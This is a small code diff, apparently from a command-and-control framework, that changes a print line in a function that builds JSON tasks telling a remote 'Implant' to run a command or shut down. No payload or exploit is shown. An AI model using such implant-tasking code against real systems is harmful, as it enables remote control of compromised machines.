@@ -24,7 +24,7 @@ def BuildTask(data):
             json_to_load = {"id": uuid, "Type": Type, "task": "KillImplant"}
         else:
             json_to_load = {"id": uuid, "Type": Type, "task": cmd}
-            print("\nTasking Implant " + str(uuid) + " to run: " + cmd + "\n\nOutput:")
+            print("\nTasking Implant " + str(uuid) + " to run: " + cmd + "\nOutput:")
         json_final = json.dumps(json_to_load)
         replyMsg = str.encode(json_final)
 
